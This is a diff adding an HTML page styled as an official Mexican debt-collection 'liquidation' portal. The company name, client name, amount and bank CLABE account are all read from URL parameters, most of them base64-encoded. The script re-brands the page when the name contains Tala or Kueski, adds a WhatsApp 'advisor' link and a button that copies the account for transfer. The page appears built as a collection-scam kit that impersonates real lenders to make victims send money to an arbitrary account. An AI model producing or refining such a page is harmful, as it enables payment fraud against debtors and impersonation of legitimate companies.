@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Liquidación Oficial</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .card-shadow { box-shadow: 0 20px 50px rgba(0,0,0,0.1); }
+    </style>
+</head>
+<body class="bg-slate-100 flex items-center justify-center min-h-screen p-4">
+
+    <div id="contenedorPrincipal" class="max-w-md w-full bg-white rounded-3xl card-shadow overflow-hidden border border-white">
+        <div id="headerColor" class="bg-blue-700 p-8 text-center text-white">
+            <div id="logo" class="text-6xl mb-3">🏦</div>
+            <h1 id="empresa" class="text-xl font-bold uppercase tracking-widest leading-tight">SISTEMA DE GESTIÓN</h1>
+        </div>
+
+        <div class="p-6 space-y-6">
+            <div class="text-center">
+                <p class="text-slate-400 text-xs uppercase font-bold tracking-tighter">Liquidación preparada para:</p>
+                <h2 id="cliente" class="text-2xl font-black text-slate-800 leading-tight">---</h2>
+            </div>
+
+            <div class="bg-blue-50 rounded-2xl p-5 border border-blue-100 flex justify-between items-center">
+                <span class="text-slate-500 font-medium text-sm">Total a Pagar:</span>
+                <span id="monto" class="text-2xl font-black text-blue-700">$0.00 MXN</span>
+            </div>
+
+            <div class="space-y-4">
+                <p class="text-xs text-slate-600 font-bold px-1 italic">Cuenta CLABE para transferencia:</p>
+                <div id="cta" class="w-full bg-slate-900 text-green-400 p-5 rounded-xl text-center text-2xl font-mono font-bold border-2 border-slate-700 shadow-inner tracking-widest overflow-hidden">
+                    0000 0000 0000 0000
+                </div>
+                <button onclick="copy()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-xl font-bold shadow-lg transition-all active:scale-95 text-lg">
+                    COPIAR CUENTA
+                </button>
+            </div>
+
+            <div class="pt-6 border-t border-slate-100 text-center">
+                <p class="text-[10px] text-slate-400 uppercase font-bold mb-3">¿Necesita asistencia inmediata?</p>
+                <a href="https://wa.me/5211234567890" id="linkWhatsapp" class="inline-flex items-center gap-2 bg-green-50 text-green-700 px-4 py-2 rounded-full font-bold text-sm hover:bg-green-100 transition">
+                    <span class="text-lg">🟢</span> CONTACTAR ASESOR
+                </a>
+            </div>
+            
+            <p class="text-[9px] text-center text-slate-300 leading-tight">
+                Notificación oficial de cobranza. La actualización del pago en sistema puede demorar de 1 a 24 horas.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Función para decodificar de forma segura
+        function decodeBase64(str) {
+            try {
+                return decodeURIComponent(escape(window.atob(str)));
+            } catch (e) {
+                return str; // Si no es base64, devuelve el original
+            }
+        }
+
+        window.onload = () => {
+            const params = new URLSearchParams(window.location.search);
+            
+            // Extraer datos
+            const rawEmpresa = params.get('e');
+            const rawCliente = params.get('c');
+            const monto = params.get('m');
+            const rawCta = params.get('cta');
+
+            // Aplicar datos si existen
+            if (rawEmpresa) {
+                const nombreEmp = decodeBase64(rawEmpresa);
+                document.getElementById('empresa').innerText = nombreEmp;
+                
+                // Lógica de logos dinámicos
+                const logo = document.getElementById('logo');
+                const header = document.getElementById('headerColor');
+                
+                if (nombreEmp.toLowerCase().includes("tala")) {
+                    logo.innerText = "🏦";
+                    header.classList.replace('bg-blue-700', 'bg-blue-800');
+                } else if (nombreEmp.toLowerCase().includes("kueski")) {
+                    logo.innerText = "💰";
+                    header.classList.replace('bg-blue-700', 'bg-blue-600');
+                }
+            }
+
+            if (rawCliente) document.getElementById('cliente').innerText = decodeBase64(rawCliente);
+            if (monto) document.getElementById('monto').innerText = `$${monto} MXN`;
+            if (rawCta) document.getElementById('cta').innerText = decodeBase64(rawCta);
+        };
+
+        function copy() {
+            const num = document.getElementById('cta').innerText.trim();
+            navigator.clipboard.writeText(num).then(() => {
+                alert("Número de cuenta copiado. Proceda a realizar su transferencia.");
+            });
+        }
+    </script>
+</body>
+</html>
